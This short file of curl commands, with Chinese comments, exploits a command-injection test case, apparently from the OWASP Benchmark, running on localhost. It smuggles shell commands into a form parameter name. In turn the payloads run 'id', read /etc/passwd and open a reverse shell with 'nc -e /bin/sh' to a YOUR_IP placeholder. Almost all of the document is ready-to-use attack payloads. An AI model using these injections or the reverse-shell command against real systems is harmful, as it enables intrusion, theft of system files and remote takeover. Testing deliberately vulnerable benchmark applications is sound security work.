# 执行任意命令（将命令注入到form参数名中，值固定包含"BenchmarkTest00432"）
curl -k -X POST \
  'https://127.0.0.1:8443/benchmark/cmdi-00/BenchmarkTest00432' \
  -d ';id;=BenchmarkTest00432'

# 读取文件
curl -k -X POST \
  'https://127.0.0.1:8443/benchmark/cmdi-00/BenchmarkTest00432' \
  -d ';cat /etc/passwd;=BenchmarkTest00432'

# 反向shell
curl -k -X POST \
  'https://127.0.0.1:8443/benchmark/cmdi-00/BenchmarkTest00432' \
  -d ';nohup nc -e /bin/sh YOUR_IP 4444 &;=BenchmarkTest00432'